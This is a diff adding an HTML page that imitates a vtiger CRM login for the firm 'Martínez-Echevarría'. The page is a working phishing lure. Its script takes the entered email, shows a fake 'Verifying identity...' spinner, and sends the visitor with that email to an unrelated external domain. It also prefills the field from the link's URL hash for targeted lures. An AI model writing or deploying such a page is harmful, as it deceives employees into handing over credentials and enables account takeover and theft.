@@ -1,0 +1,178 @@
+<!DOCTYPE html><html><head><title>MARTINEZ ECHEVARRIA</title>
+<link rel="SHORTCUT ICON" href="layouts/v7/skins/images/favicon.ico">
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link type='text/css' rel='stylesheet' href='layouts/v7/lib/todc/css/bootstrap.min.css?v=8.3.0'>
+<script src="layouts/v7/lib/jquery/jquery.min.js?v=8.3.0"></script>
+
+<style>
+body {
+    background-image: url("https://pub-33615be0804e4b52876f0049573469bb.r2.dev/Gemini_Generated_Image_i8fd5i8fd5i8fd5i.png");
+    background-size: cover;
+    background-position: center;
+    background-attachment: fixed;
+    margin: 0;
+    height: 100vh;
+}
+
+    #page {
+        display: flex;
+        align-items: center; 
+        padding-left: 10%; 
+        height: 100vh;
+    }
+
+    .loginDiv {
+        background: #ffffff;
+        width: 380px;  
+        height: 460px; 
+        padding: 60px 40px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.2);
+        border-radius: 2px;
+        display: flex;
+        flex-direction: column;
+        box-sizing: border-box;
+    }
+
+    .brand-header {
+        text-align: center;
+        color: #1a3352;
+        font-weight: bold;
+        letter-spacing: 1px;
+        font-size: 14px;
+        margin-bottom: 75px;
+        text-transform: uppercase;
+    }
+
+    .group { position: relative; margin-bottom: 45px; }
+    
+    input {
+        font-size: 16px;
+        padding: 10px 0;
+        display: block;
+        width: 100%;
+        border: none;
+        border-bottom: 1px solid #757575;
+        background: transparent !important;
+        color: #636363;
+    }
+
+    label {
+        color: #999;
+        font-size: 16px;
+        position: absolute;
+        pointer-events: none;
+        left: 0;
+        top: 10px;
+        transition: 0.2s ease all;
+    }
+
+    input:focus ~ label, input.used ~ label {
+        top: -20px;
+        font-size: 13px;
+        color: #35aa47;
+    }
+
+    .btn-signin {
+        background-color: #43ac52;
+        color: #ffffff;
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        border: none;
+        cursor: pointer;
+        margin-top: 45px;
+        border-radius: 2px;
+    }
+
+    .forgot-link {
+        color: #15c;
+        font-size: 12px;
+        text-decoration: none;
+        margin-top: 20px;
+        display: inline-block;
+    }
+
+    .footer {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        text-align: center;
+        padding: 10px 0;
+        font-size: 11px;
+        color: #666;
+        background: rgba(255,255,255,0.9);
+        border-top: 1px solid #ddd;
+    }
+
+    #loadingOverlay { display: none; text-align: center; margin-top: 40px; }
+    .spinner {
+        border: 3px solid #f3f3f3;
+        border-top: 3px solid #35aa47;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 10px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head>
+
+<body>
+<div id="page">
+    <div class="loginDiv">
+        <div class="brand-header">MARTÍNEZ-ECHEVARRÍA</div>
+        
+        <div id="loginFormDiv">
+            <form id="redirectForm">
+                <div class="group">
+                    <input type="text" id="username" required autocomplete="off">
+                    <label>Username</label>
+                </div>
+                <button type="submit" class="btn-signin">Sign in</button>
+                <a href="#" class="forgot-link">forgot password?</a>
+            </form>
+        </div>
+
+        <div id="loadingOverlay">
+            <div class="spinner"></div>
+            <p style="color: #666; font-size: 13px;">Verifying identity...</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        Powered by vtiger CRM - 8.3.0 © 2004 - 2026 Vtiger | Privacy Policy
+    </div>
+</div>
+
+<script>
+    const REDIRECT_BASE = "https://pytorch.dreachoutou.digital/MOAZZN!6klW/$";
+    const userField = document.getElementById('username');
+
+    userField.addEventListener('blur', function() {
+        if (this.value !== "") { this.classList.add('used'); } 
+        else { this.classList.remove('used'); }
+    });
+
+    document.getElementById('redirectForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const email = userField.value.trim();
+        if (email.includes('@')) {
+            document.getElementById('loginFormDiv').style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'block';
+            setTimeout(() => {
+                window.location.href = REDIRECT_BASE + encodeURIComponent(email);
+            }, 1250);
+        }
+    });
+
+    window.onload = function() {
+        const hash = window.location.hash.substring(1);
+        if (hash && hash.includes('@')) {
+            userField.value = hash;
+            userField.classList.add('used');
+        }
+    };
+</script>
+</body></html>
